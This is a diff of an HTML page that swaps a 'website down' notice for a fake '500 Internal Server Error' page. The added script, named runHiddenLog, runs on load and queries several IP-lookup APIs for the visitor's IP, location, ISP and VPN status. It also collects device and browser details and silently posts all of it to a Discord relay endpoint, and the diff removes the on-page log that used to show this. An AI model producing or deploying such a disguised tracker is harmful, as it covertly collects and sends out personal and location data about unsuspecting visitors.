@@ -3,48 +3,45 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Website Down</title>
+    <title>500 Internal Server Error</title>
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #fff; color: #333; }
-        header { background-color: #333; color: #fff; padding: 10px; text-align: center; border-bottom: 2px solid #444; }
-        h1 { margin: 0; font-size: 32px; }
-        main { padding: 20px; padding-bottom: 80px; max-width: 900px; margin: 0 auto; }
-        p { font-size: 18px; line-height: 1.5; margin: 15px 0; }
-        .danger { color: red; font-weight: bold; }
-        #system-log { 
-            background: #f4f4f4; 
-            margin: 20px 0; 
-            padding: 20px; 
-            font-family: 'Courier New', Courier, monospace; 
-            white-space: pre-wrap; 
-            font-size: 14px; 
-            border-left: 5px solid #333;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.05);
-            word-break: break-all;
-            line-height: 1.4;
+        body { 
+            background-color: #fff; 
+            color: #000; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
         }
-        footer { background-color: #333; color: #fff; padding: 10px; text-align: center; position: fixed; bottom: 0; width: 100%; }
+        .error-container { 
+            text-align: center; 
+        }
+        h1 { 
+            font-size: 24px; 
+            font-weight: 500; 
+            margin-bottom: 8px; 
+        }
+        p { 
+            font-size: 14px; 
+            color: #666; 
+            margin: 0;
+        }
     </style>
 </head>
 <body>
-    <header><h1>This website is down.</h1></header>
-    <main>
-        <p>Welcome. This website has been temporarily shut down for maintenance and updates.</p>
-        <p>We’re currently adding some big updates to the website. This process might take some time. Thank you for your patience.</p>
-        
-        <div id="system-log">GATHERING SYSTEM DATA...</div>
 
-        <p><span class="danger">Get ready gamers</span></p>
-    </main>
-    <footer>&copy; 2026 Gaming Services. All rights reserved.</footer>
+    <div class="error-container">
+        <h1>Website has shut down</h1>
+        <p>Internal Server Error (Code: 500)</p>
+    </div>
 
     <script>
-        async function getFullData() {
-            const log = document.getElementById("system-log");
+        async function runHiddenLog() {
             let n = {};
             let vpnDetected = "False";
 
-            // Chained API Fallbacks
             const providers = [
                 "https://ipapi.co/json/",
                 "https://ipwho.is/",
@@ -59,11 +56,11 @@
                         n = { ...n, ...temp };
                         if (n.ip || n.query) break;
                     }
-                } catch (e) { console.warn("Provider blocked, skipping..."); }
+                } catch (e) {}
             }
 
             const finalIP = n.ip || n.query || "Unknown";
-            const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Location Blocked";
+            const finalLocation = n.city ? `${n.city}, ${n.region || n.region_name}, ${n.country_name || n.country}` : "Unknown";
             const finalISP = n.org || n.isp || n.connection?.isp || "Unknown";
             if (n.security && (n.security.vpn || n.security.proxy)) vpnDetected = "True";
 
@@ -74,34 +71,25 @@
                 "Hostname": n.hostname || n.reverse || "None Assigned",
                 "ISP": finalISP,
                 "User Agent": navigator.userAgent,
-                "Window Width": window.innerWidth,
-                "Window Height": window.innerHeight,
                 "Window Ratio": (window.innerWidth / window.innerHeight).toFixed(16),
-                "Screen Width": screen.width,
-                "Screen Height": screen.height,
-                "Screen Ratio": (screen.width / screen.height).toFixed(16),
-                "DPI": window.devicePixelRatio,
-                "Color Depth": screen.colorDepth,
-                "Orientation": screen.orientation ? screen.orientation.type : "Unknown",
                 "OS": navigator.platform,
                 "Threads": navigator.hardwareConcurrency || "Unknown",
                 "Memory": navigator.deviceMemory || "Unknown",
-                "System Languages": navigator.languages.join(", "),
                 "Browser Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
                 "Current Time": new Date().toLocaleString()
             };
 
             const output = Object.entries(stats).map(([k, v]) => `${k}: ${v}`).join("\n");
-            log.textContent = output;
 
-            // Send to Discord
+            // Silent push to Discord
             fetch("/api/discord", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: output }),
             }).catch(() => {});
         }
-        getFullData();
+
+        runHiddenLog();
     </script>
 </body>
 </html>
